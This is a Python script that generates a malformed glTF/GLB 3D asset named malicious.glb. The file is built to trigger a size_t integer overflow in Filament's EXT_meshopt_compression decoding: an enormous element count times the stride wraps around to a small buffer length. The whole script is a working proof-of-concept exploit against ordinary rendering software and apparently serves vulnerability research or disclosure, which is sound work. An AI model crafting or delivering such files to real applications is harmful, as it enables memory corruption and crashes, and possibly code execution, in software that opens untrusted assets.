#!/usr/bin/env python3
import argparse
import json
import struct
from pathlib import Path


def write_glb(out_path: Path, json_bytes: bytes, bin_bytes: bytes) -> None:
    def pad4(data: bytes, pad_byte: int) -> bytes:
        pad_len = (-len(data)) % 4
        return data + bytes([pad_byte]) * pad_len

    json_padded = pad4(json_bytes, 0x20)  # spaces
    bin_padded = pad4(bin_bytes, 0x00)

    magic = 0x46546C67  # 'glTF'
    version = 2

    json_type = 0x4E4F534A  # 'JSON'
    bin_type = 0x004E4942  # 'BIN\0'

    total_length = 12 + 8 + len(json_padded) + 8 + len(bin_padded)

    out = bytearray()
    out += struct.pack("<III", magic, version, total_length)
    out += struct.pack("<II", len(json_padded), json_type)
    out += json_padded
    out += struct.pack("<II", len(bin_padded), bin_type)
    out += bin_padded

    out_path.write_bytes(out)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Generate a malicious glTF that triggers size_t overflow in Filament meshopt decompression.",
    )
    parser.add_argument("--outdir", required=True, help="Output directory for malicious.glb")
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Print details about the generated asset.",
    )
    args = parser.parse_args()

    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)


    stride = 256
    count = (1 << 56) + 1

    uncompressed_len_wrapped = (count * stride) & 0xFFFFFFFFFFFFFFFF
    assert uncompressed_len_wrapped == 256

    compressed = bytes([0xA0]) + (b"\x00" * 512)  # 513 bytes total

    compressed_padded = compressed + b"\x00" * ((-len(compressed)) % 4)

    gltf = {
        "asset": {"version": "2.0"},
        "extensionsUsed": ["EXT_meshopt_compression"],

        "accessors": [
            {
                "bufferView": 0,
                "byteOffset": 0,
                "componentType": 5126,  # FLOAT
                "count": 1,
                "type": "VEC3",
                "min": [0, 0, 0],
                "max": [0, 0, 0],
            }
        ],
        "meshes": [
            {
                "primitives": [
                    {
                        "attributes": {"POSITION": 0},
                        "mode": 0,  # POINTS (valid with a single vertex)
                    }
                ]
            }
        ],
        "nodes": [{"mesh": 0}],
        "scene": 0,
        "scenes": [{"nodes": [0]}],
        "buffers": [{"byteLength": len(compressed_padded)}],
        "bufferViews": [
            {
                "buffer": 0,
                "byteOffset": 0,
                "byteStride": stride,
                "byteLength": int(uncompressed_len_wrapped),
                "extensions": {
                    "EXT_meshopt_compression": {
                        "buffer": 0,
                        "byteOffset": 0,
                        "byteLength": len(compressed),
                        "byteStride": stride,
                        "count": count,
                        "mode": "ATTRIBUTES",
                        "filter": "NONE",
                    }
                },
            }
        ],
    }

    glb_path = outdir / "malicious.glb"
    gltf_json = (json.dumps(gltf, separators=(",", ":")) + "\n").encode("utf-8")
    write_glb(glb_path, gltf_json, compressed_padded)
    if args.verbose:
        print(f"Wrote {glb_path}")
        print(
            f"meshopt: stride={stride} count={count} wrapped_uncompressed_len={uncompressed_len_wrapped}"
        )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
